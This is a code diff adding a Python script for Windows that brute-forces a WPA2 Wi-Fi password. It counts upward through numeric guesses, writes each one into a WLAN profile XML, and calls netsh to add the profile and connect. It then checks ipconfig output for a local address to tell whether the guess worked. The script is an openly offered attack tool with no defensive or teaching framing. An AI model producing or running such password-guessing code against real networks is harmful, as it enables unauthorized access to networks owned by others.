@@ -1,0 +1,125 @@
+import os         
+import subprocess
+import time
+import sys
+
+os.system('cls')
+sys.setrecursionlimit(999999999) # using to extend recursion limit.
+name = "examplewifi"      # set wifi password that avalable in your area.
+wifipass="100000000"     # set wifi pass in number that help pwdfun function to incriment wifipass by one.
+
+# below code change or create wifi file name 
+def createNewConnection(name, SSID, password): 
+
+    config = """<?xml version=\"1.0\"?> 
+
+  <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"> 
+
+    <name>"""+name+"""</name> 
+
+    <SSIDConfig> 
+
+        <SSID> 
+
+            <name>"""+SSID+"""</name> 
+
+        </SSID> 
+
+    </SSIDConfig> 
+
+    <connectionType>ESS</connectionType> 
+
+    <connectionMode>auto</connectionMode> 
+
+    <MSM> 
+
+        <security> 
+
+            <authEncryption> 
+
+                <authentication>WPA2PSK</authentication> 
+
+                <encryption>AES</encryption> 
+
+                <useOneX>false</useOneX> 
+
+            </authEncryption> 
+
+            <sharedKey> 
+
+                <keyType>passPhrase</keyType> 
+
+                <protected>false</protected> 
+
+                <keyMaterial>"""+password+"""</keyMaterial> 
+
+            </sharedKey> 
+
+        </security> 
+
+    </MSM> 
+
+  </WLANProfile>"""
+
+     
+
+    with open(name+".xml", 'w') as file: 
+
+        file.write(config) 
+
+    command = "netsh wlan add profile filename=\""+name+".xml\""+" interface=Wi-Fi"    
+    return1 = subprocess.check_output(command) 
+    
+
+# below code change wifipass by adding one in previous wifipass and 
+#      try that password by calling submit funtion but 
+#            after wating 2 second for wifi trying password.
+def pwdfun(name):
+     global wifipass
+     pwd=int(wifipass)
+     pwd=pwd+1
+     wifipass=str(pwd)
+     print(wifipass)
+     try:
+       submit(name)
+     except:
+         print("error raised")
+         time.sleep(2)
+         submit(name)   
+  
+
+# check wheater connected to any wifi or not
+# if not connected than call pwdfun funtion for check on another password. 
+def check_connected(name):
+    time.sleep(2)
+    command="ipconfig"
+    returnCmd=subprocess.check_output(command)
+    return2=returnCmd.decode("utf-8")
+    if "192" in return2:
+       print("connected")
+    else:  
+       pwdfun(name)
+    
+    
+
+# function to connecting to a network     
+
+def connecting(name):  
+    command = "netsh wlan connect \""+name+"\"" 
+    return1 = subprocess.check_output(command)
+    
+    
+
+def submit(name): 
+    password = wifipass
+    if(name==""):
+        print("need wifi name")
+    elif(len(password) < 3):
+        print("need wifi password")
+    else:        
+     createNewConnection(name, name, password) 
+     connecting(name)
+     check_connected(name)
+
+
+submit(name)   # that call submit funtion to run this project/file initially.
